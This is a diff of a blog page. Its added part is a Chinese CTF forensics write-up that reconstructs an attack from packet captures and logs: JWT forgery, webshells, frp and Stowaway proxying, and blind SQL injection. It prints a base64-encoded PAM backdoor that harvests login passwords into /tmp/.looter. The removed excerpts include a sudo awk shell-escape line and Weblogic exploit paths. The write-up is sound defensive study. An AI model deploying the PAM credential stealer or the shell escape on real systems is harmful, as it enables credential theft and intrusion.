+<h3 id="2-2黑客绕过验证使用的JWT中，id和username是"><a href="#2-2黑客绕过验证使用的JWT中，id和username是" class="headerlink" title="2.2黑客绕过验证使用的JWT中，id和username是__"></a>2.2黑客绕过验证使用的JWT中，id和username是__</h3><p>用wirkshark进行过滤，因为是涉及到id和username，猜测用的是post方法。</p>
+<p>所以wireshark语法为http.request.method==”POST” ,找到一个info为identity数据包追踪流。</p>
+<p>这里由于我菜，一直以为</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921112205948.png" alt="image-20210921112205948"></p>
+<p>这个是明码标价告诉了我答案（当时我还觉得自己很聪明，id就是identity的缩写），后头才发现是社会的毒打。</p>
+<p>还是需要通过jwt解密，所以复制token，去jwt在线解密</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921112758927.png" alt="image-20210921112758927"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921113011339.png" alt="image-20210921113011339"></p>
+<p>然后发现是错的！！！！</p>
+<p>然后就只有一个一个查包，终于再这样一个包下</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921114517944.png" alt="image-20210921114517944"></p>
+<p>发现了不一样的token</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921114537721.png" alt="image-20210921114537721"></p>
+<p>然后复制解码</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921114557729.png" alt="image-20210921114557729"></p>
+<p>所以答案为10087#admin</p>
+<h3 id="2-3黑客获取webshell之后，权限是"><a href="#2-3黑客获取webshell之后，权限是" class="headerlink" title="2.3黑客获取webshell之后，权限是__"></a>2.3黑客获取webshell之后，权限是__</h3><p>就在刚刚找到token的包里面，仔细看就会发现他输入了whoami命令，用来查看权限。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921115205593.png" alt="image-20210921115205593"></p>
+<p>然后服务器弹出框： alert(“root\n”)</p>
+<p>所以答案为root</p>
+<h3 id="2-4黑客上传的恶意文件文件名是"><a href="#2-4黑客上传的恶意文件文件名是" class="headerlink" title="2.4黑客上传的恶意文件文件名是__"></a>2.4黑客上传的恶意文件文件名是__</h3><p>依然是找包，发现有一个这样的包</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921122936324.png" alt="image-20210921122936324"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command=echo%20I2luY2x1ZGUgPHN0ZGlvLmg%2bCiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPGN1cmwvY3VybC5oPgojaW5jbHVkZSA8c3RyaW5nLmg%2bCiNpbmNsdWRlIDxzZWN1cml0eS9wYW1fYXBwbC5oPgojaW5jbHVkZSA8c2VjdXJpdHkvcGFtX21vZHVsZXMuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgpzaXplX3Qgd3JpdGVfZGF0YSh2b2lkICpidWZmZXIsIHNpemVfdCBzaXplLCBzaXplX3Qgbm1lbWIsIHZvaWQgKnVzZXJwKQp7CnJldHVybiBzaXplICogbm1lbWI7Cn0KCnZvaWQgc2F2ZU1lc3NhZ2UoY2hhciAoKm1lc3NhZ2UpW10pIHsKRklMRSAqZnAgPSBOVUxMOwpmcCA9IGZvcGVuKCIvdG1wLy5sb290ZXIiLCAiYSsiKTsKZnB1dHMoKm1lc3NhZ2UsIGZwKTsKZmNsb3NlKGZwKTsKfQoKUEFNX0VYVEVSTiBpbnQgcGFtX3NtX3NldGNyZWQoIHBhbV9oYW5kbGVfdCAqcGFtaCwgaW50IGZsYWdzLCBpbnQgYXJnYywgY29uc3QgY2hhciAqKmFyZ3YgKSB7CnJldHVybiBQQU1fU1VDQ0VTUzsKfQoKUEFNX0VYVEVSTiBpbnQgcGFtX3NtX2FjY3RfbWdtdChwYW1faGFuZGxlX3QgKnBhbWgsIGludCBmbGFncywgaW50IGFyZ2MsIGNvbnN0IGNoYXIgKiphcmd2KSB7CnJldHVybiBQQU1fU1VDQ0VTUzsKfQoKUEFNX0VYVEVSTiBpbnQgcGFtX3NtX2F1dGhlbnRpY2F0ZSggcGFtX2hhbmRsZV90ICpwYW1oLCBpbnQgZmxhZ3MsaW50IGFyZ2MsIGNvbnN0IGNoYXIgKiphcmd2ICkgewppbnQgcmV0dmFsOwpjb25zdCBjaGFyKiB1c2VybmFtZTsKY29uc3QgY2hhciogcGFzc3dvcmQ7CmNoYXIgbWVzc2FnZVsxMDI0XTsKcmV0dmFsID0gcGFtX2dldF91c2VyKHBhbWgsICZ1c2VybmFtZSwgIlVzZXJuYW1lOiAiKTsKcGFtX2dldF9pdGVtKHBhbWgsIFBBTV9BVVRIVE9LLCAodm9pZCAqKSAmcGFzc3dvcmQpOwppZiAocmV0dmFsICE9IFBBTV9TVUNDRVNTKSB7CnJldHVybiByZXR2YWw7Cn0KCnNucHJpbnRmKG1lc3NhZ2UsMjA0OCwiVXNlcm5hbWUgJXNcblBhc3N3b3JkOiAlc1xuIix1c2VybmFtZSxwYXNzd29yZCk7CnNhdmVNZXNzYWdlKCZtZXNzYWdlKTsKcmV0dXJuIFBBTV9TVUNDRVNTOwp9|base64%20-d%20&gt;/tmp/1.c</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>黑客将一些特殊编码保存为一个叫做1.c的文件，所以我们可以知道答案为1.c</p>
+<h3 id="2-5-黑客再服务器上编译的恶意so文件，文件名是"><a href="#2-5-黑客再服务器上编译的恶意so文件，文件名是" class="headerlink" title="2.5 黑客再服务器上编译的恶意so文件，文件名是__"></a>2.5 黑客再服务器上编译的恶意so文件，文件名是__</h3><p>这个题目很明显是后缀为so的文件，随便找包就会发现一个叫做looter.so的文件</p>
+<p>所以答案为looter.so</p>
+<h3 id="2-6-黑客在服务器上修改了一个配置文件，文件的绝对路径为"><a href="#2-6-黑客在服务器上修改了一个配置文件，文件的绝对路径为" class="headerlink" title="2.6 黑客在服务器上修改了一个配置文件，文件的绝对路径为__"></a>2.6 黑客在服务器上修改了一个配置文件，文件的绝对路径为__</h3><p>找到这样一个数据包</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921123617539.png" alt="image-20210921123617539"></p>
+<p>里面</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921123626390.png" alt="image-20210921123626390"></p>
+<p>可以知道文件被导向/etc/pam.d/common-auth路径，猜测这就是被修改的配置文件。</p>
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="3-1黑客登陆系统使用的密码是"><a href="#3-1黑客登陆系统使用的密码是" class="headerlink" title="3.1黑客登陆系统使用的密码是__"></a>3.1黑客登陆系统使用的密码是__</h3><p>使用wireshark打开下载下来的’hack.pcap’流量包</p>
+<p>过滤语法为http.request.method==”POST”</p>
+<p>找到一个描述为</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921155539684.png" alt="image-20210921155539684"></p>
+<p>的包，打开进入tcp流</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921155600629.png" alt="image-20210921155600629"></p>
+<p>所以密码为：Admin!@#</p>
+<h3 id="3-2黑客修改了一个日志文件，文件的绝对路径为"><a href="#3-2黑客修改了一个日志文件，文件的绝对路径为" class="headerlink" title="3.2黑客修改了一个日志文件，文件的绝对路径为__"></a>3.2黑客修改了一个日志文件，文件的绝对路径为__</h3><p>仍然是通过post方法来找，发现有许多个包都指向了一个相对路径<img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921161425752.png" alt="image-20210921161425752"></p>
+<p>在代码为332包里，看到黑客将webshell写入了一个<img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921161837619.png" alt="image-20210921161837619"></p>
+<p>的文件，所以猜测绝对路径就是进行了拼接</p>
+<p>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</p>
+<h3 id="3-3黑客获取webshell之后的权限是："><a href="#3-3黑客获取webshell之后的权限是：" class="headerlink" title="3.3黑客获取webshell之后的权限是："></a>3.3黑客获取webshell之后的权限是：</h3><p>找到两个带有命令whoami的包里，代码为200那一个，找到它的返回包</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921163714462.png" alt="image-20210921163714462"></p>
+<p>319包</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921163739281.png" alt="image-20210921163739281"></p>
+<p>便可以看到权限为www-data</p>
+<h3 id="3-4黑客写入的webshell文件名是"><a href="#3-4黑客写入的webshell文件名是" class="headerlink" title="3.4黑客写入的webshell文件名是__"></a>3.4黑客写入的webshell文件名是__</h3><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922141406481.png" alt="image-20210922141406481"></p>
+<p>通过流量分析找到webshell的文件名，发现了一个叫做1.php的文件，这个很可能就是一个webshell文明名。</p>
+<h3 id="3-5黑客上传的代理工具客户端名字是"><a href="#3-5黑客上传的代理工具客户端名字是" class="headerlink" title="3.5黑客上传的代理工具客户端名字是__"></a>3.5黑客上传的代理工具客户端名字是__</h3><p>这道题也是看了网上师傅的解法，为什么这么做哥们完全不知道，找到了序号为343的流量包，打开发现</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922145012989.png" alt="image-20210922145012989"></p>
+<p>经过url解码</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922145204628.png" alt="image-20210922145204628"></p>
+<p>然后截取那个以j68的，字符进行base64解码，从第二位算起</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922145310546.png" alt="image-20210922145310546"></p>
+<p>得到为frpc.ini</p>
+<h3 id="3-6黑客代理工具的回连服务端ip是"><a href="#3-6黑客代理工具的回连服务端ip是" class="headerlink" title="3.6黑客代理工具的回连服务端ip是_"></a>3.6黑客代理工具的回连服务端ip是_</h3><p>将344包中POST内容中键值为xa5d….</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922150124976.png" alt="image-20210922150124976"></p>
+<p>进行十六进制转换。</p>
+<p>然后就</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922150151245.png" alt="image-20210922150151245"></p>
+<h3 id="3-7黑客的socks5得连接账号、密码是"><a href="#3-7黑客的socks5得连接账号、密码是" class="headerlink" title="3.7黑客的socks5得连接账号、密码是__"></a>3.7黑客的socks5得连接账号、密码是__</h3><p>仍然是344包，追踪tcp流，并进行16进制解码，得到用户名和密码</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922152441681.png" alt="image-20210922152441681"></p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="8-1黑客在注入过程中采用的注入手法叫"><a href="#8-1黑客在注入过程中采用的注入手法叫" class="headerlink" title="8.1黑客在注入过程中采用的注入手法叫__"></a>8.1黑客在注入过程中采用的注入手法叫__</h3><p>下载下来文件发现只有一个日志文件。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922155115371.png" alt="image-20210922155115371"></p>
+<p>打开，又关掉（hhhhh）</p>
+<p>这种日志形式的sql注入回显，不必多言，就是布尔盲注类型</p>
+<p>这里说一下布尔盲注的定义：</p>
+<p>基于布尔的盲注：<br>Web的页面的仅仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。页面没有显示为，没有输出sql语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。</p>
+<h3 id="8-2黑客在注入过程中，最终获取flag的数据库名、表名和字段名是-。"><a href="#8-2黑客在注入过程中，最终获取flag的数据库名、表名和字段名是-。" class="headerlink" title="8.2黑客在注入过程中，最终获取flag的数据库名、表名和字段名是__。"></a>8.2黑客在注入过程中，最终获取flag的数据库名、表名和字段名是__。</h3><p>这个主要是通过页面回显的字数来判断你是否正确的猜到名字。</p>
+<p>这里进行一个简单的举例：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922160140196.png" alt="image-20210922160140196"></p>
+<p>这个是在猜测库名的第一个字符。我们发现网页回显的字数，大多数都在418 417左右，到但是最后一个472明显多了很多，我们猜测他就是正确的回显。即数据库名的第一个字符为’S’</p>
+<p>由此可以举一反三，东施效颦，做出来答案为：</p>
+<p>库名：sqli， 表名：flag   字段：flag</p>
+<h3 id="8-3-flag值为"><a href="#8-3-flag值为" class="headerlink" title="8.3 flag值为_"></a>8.3 flag值为_</h3><p>这道题一个个来拼接确实太麻烦了。最好是动用脚本</p>
+<p>脚本就直接抄另外师傅的了</p>
+<p>from urllib import parse<br>num=0<br>line=0<br>tmp1=1<br>tmp2=2<br>str1=’’</p>
+<p>with open(“access.log”,’r’) as f:<br>    string=f.readline()<br>    while(string !=’’):</p>
+<pre><code>    if(&quot;sqli.flag&quot; in string):
         
-          <a class="article-more-a" href="/2022/04/24/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E4%B8%8E%E5%8F%8D%E7%97%85%E6%AF%92%E4%BB%8B%E7%BB%8D/#more">more >></a>
-        
+        string=parse.unquote(string)
+        num=string.find(&quot;sqli.flag&quot;)#字符
+        num+=19
+        line=string.find(&quot;sqli.flag&quot;)
+        line+=11
+        if(string[line+1] ==&quot;,&quot;):
+            tmp1=int(string[line])
+        elif(string[line+1] !=&quot;,&quot;):
+            num+=1
+            tmp1=int(string[line:line+2])
+</code></pre>
+<p>​<br>​            if(tmp1 ==tmp2): #发现目标字符，是上一行的<br>​                tmp2+=1<br>​                print(str1,end=””)<br>​<br>​        str1=string[num] #保留上一行的字符<br>​        string=f.readline()</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46245411/article/details/120304208">https://blog.csdn.net/weixin_46245411/article/details/120304208</a></p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="4-1网络存在源码泄露，源码文件名是"><a href="#4-1网络存在源码泄露，源码文件名是" class="headerlink" title="4.1网络存在源码泄露，源码文件名是_"></a>4.1网络存在源码泄露，源码文件名是_</h3><p>打开下载下来得日志文件发现，网页里面有许多请求。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923103047988.png" alt="image-20210923103047988"></p>
+<p>其中404请求是非正常访问的，所以我们只需要看200请求的就好了。过滤一下200，然后发现</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923103217663.png" alt="image-20210923103217663"></p>
+<p>有这么一个记录，而且还是zip形式压缩包，所以该题答案为<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<h3 id="4-2-分析攻击流量，黑客往-tmp目录写入了一个文件，文件名为"><a href="#4-2-分析攻击流量，黑客往-tmp目录写入了一个文件，文件名为" class="headerlink" title="4.2 分析攻击流量，黑客往/tmp目录写入了一个文件，文件名为__"></a>4.2 分析攻击流量，黑客往/tmp目录写入了一个文件，文件名为__</h3><p>因为题目都说了是往/tmp写入文件，所以我们只需要搜索/tmp</p>
+<p>然后发现了这样的记录</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923103531678.png" alt="image-20210923103531678"></p>
+<p>由此可知答案为secc_car</p>
+<h3 id="4-3分析攻击流量，黑客使用的是-类读取了秘密文件。"><a href="#4-3分析攻击流量，黑客使用的是-类读取了秘密文件。" class="headerlink" title="4.3分析攻击流量，黑客使用的是__类读取了秘密文件。"></a>4.3分析攻击流量，黑客使用的是__类读取了秘密文件。</h3><p>这道题就是看看上面那题的日志记录后面，发现一个php的函数</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923104036082.png" alt="image-20210923104036082"></p>
+<p>这里简单说一下该函数是为了php处理大文件读取的函数。</p>
+<p>所以该题答案为splfileobject</p>
+<h2 id="ios题"><a href="#ios题" class="headerlink" title="ios题"></a>ios题</h2><h3 id="10-1-黑客所控制的C-amp-C服务器ip是"><a href="#10-1-黑客所控制的C-amp-C服务器ip是" class="headerlink" title="10.1 黑客所控制的C&amp;C服务器ip是_"></a>10.1 黑客所控制的C&amp;C服务器ip是_</h3><p>C&amp;C服务器的全称为dommand and control server，翻译过来就是命令和控制服务器。他类似于一个黑客和受害者的中间件。因为我国普通人是缺少公网ip地址的，所以，黑客经常使用一个中间服务器（比如阿里云，腾讯云等）来充当C&amp;C服务器。这个中间服务器的作用是将我们本地内网的主机监听的端口映射到公网ip的某个端口，这样受害者机器访问中转服务器监听的端口时就相当于访问了我们本地监听的端口。</p>
+<p>此题就是要我们找到中间服务器的ip地址。打开下载下来的流量包。</p>
+<p>第一题在机缘巧合之下，我们找到了序号为262的流量包。</p>
+<p>打开发现<img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923110605369.png" alt="image-20210923110605369"></p>
+<p>可见黑客做了端口转发操作，由此，可知ip地址为 3.128.156.159</p>
+<h3 id="10-2黑客利用的github开源项目的名字为"><a href="#10-2黑客利用的github开源项目的名字为" class="headerlink" title="10.2黑客利用的github开源项目的名字为__"></a>10.2黑客利用的github开源项目的名字为__</h3><p>同样是上面的流量包</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923110801977.png" alt="image-20210923110801977"></p>
+<p>可知它在github上下了一个叫做stowaway的软件。</p>
+<h3 id="10-3通讯加密密钥的明文是"><a href="#10-3通讯加密密钥的明文是" class="headerlink" title="10.3通讯加密密钥的明文是_"></a>10.3通讯加密密钥的明文是_</h3><p>上题我们知道他用的是stowaway，然后github进去看看这个软件的介绍</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p>
+<p>我们可以发现：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923111118010.png" alt="image-20210923111118010"></p>
+<p>然后就可以知道，这个东西了。就是第一题图里的</p>
+<p>hack4sec</p>
+<h3 id="10-4黑客通过sql盲注拿到了一个敏感数据，内容是"><a href="#10-4黑客通过sql盲注拿到了一个敏感数据，内容是" class="headerlink" title="10.4黑客通过sql盲注拿到了一个敏感数据，内容是_"></a>10.4黑客通过sql盲注拿到了一个敏感数据，内容是_</h3><p>这里需要用到我们下载下来的另一个文件，keylog.txt，我们需要将它导入到wireshark来解密一些加密的传输包。然后输入http2，可以发现类似于sql注入的痕迹</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923114802350.png" alt="image-20210923114802350"></p>
+<p>然后就只需要拼接了</p>
+<p>最后答案为：746558f3-c841-456b-85d7-d6c0f2edabb2</p>
+<h3 id="10-5-黑客端口扫描的扫描器的扫描范围是："><a href="#10-5-黑客端口扫描的扫描器的扫描范围是：" class="headerlink" title="10.5 黑客端口扫描的扫描器的扫描范围是：_"></a>10.5 黑客端口扫描的扫描器的扫描范围是：_</h3><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210927120502741.png" alt="image-20210927120502741"></p>
+<p>因为我们是client，我们需要探测的服务器是server，然后扫描端口常用的工具是nmap，它的默认扫描方式是syn扫描，也就是说，它会自动对端口发送一个syn包，然后该端口如果开着，就会返回一个syn和一个ack包，由此判断该端口是否运行。所以我们查找流量包，可以知道</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210927120649169.png" alt="image-20210927120649169"></p>
+<p>由此可以判断该题答案为10-499</p>
+<h3 id="10-6"><a href="#10-6" class="headerlink" title="10.6"></a>10.6</h3><h3 id="10-7黑客访问了-攻击了内网的几个服务器，ip地址为"><a href="#10-7黑客访问了-攻击了内网的几个服务器，ip地址为" class="headerlink" title="10.7黑客访问了/攻击了内网的几个服务器，ip地址为:_"></a>10.7黑客访问了/攻击了内网的几个服务器，ip地址为:_</h3><p>172.28.0.2#192.168.1.12</p>
+<h3 id="10-8黑客写入了一个webshell，其密码为："><a href="#10-8黑客写入了一个webshell，其密码为：" class="headerlink" title="10.8黑客写入了一个webshell，其密码为：_"></a>10.8黑客写入了一个webshell，其密码为：_</h3><p>翻阅access文件，发现以下<img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210927120910002.png" alt="image-20210927120910002"></p>
+<p>base64解码可以知道是在执行命令whoami，所以webshell密码为</p>
+<p>fxxk</p>
+
       
 
       
@@ -651,30 +384,78 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
+      
 
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/24/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E4%B8%8E%E5%8F%8D%E7%97%85%E6%AF%92%E4%BB%8B%E7%BB%8D/">展开全文 >></a>
-        </p>
-      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
 
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/12/15/%E9%99%87%E5%89%91%E6%9D%AFwp/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2022/11/26/ShellCode%E5%90%AB%E4%B9%89%E8%A7%A3%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ShellCode含义解析</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -694,382 +475,14 @@
 
 
 
-
-  
-    <article id="post-常见中间件漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">常见中间件漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2022-04-11T03:38:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Weblogic的<code>WLS-Security</code> 组件对外提供webservice服务，其中使用了<code>XMLDecoder</code>来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可以执行任意命令。</p>
-<p>涉及版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.3.6.0，12.1.3.0.0，12.2.1.1.0</span><br></pre></td></tr></table></figure>
-
-<p>漏洞地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/wsl-wsat/....   //只要是wsl-wsat下的url都会有此漏洞。</span><br><span class="line">比如:</span><br><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Liunx提权靶场一游" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/">Liunx提权靶场一游</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/" class="archive-article-date">
-  	<time datetime="2022-03-25T02:41:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="靶机地址与安装"><a href="#靶机地址与安装" class="headerlink" title="靶机地址与安装"></a>靶机地址与安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#下载链接</span><br><span class="line">https://www.vulnhub.com/entry/linsecurity-1,244/</span><br><span class="line">用户名密码：bob/secret</span><br><span class="line">#安装与配置</span><br><span class="line">1.修改默认键盘布局[默认不是美式键盘]</span><br><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="line">[修改前\&quot;符号是shift+2]</span><br><span class="line">vim /etc/default/keyboard</span><br><span 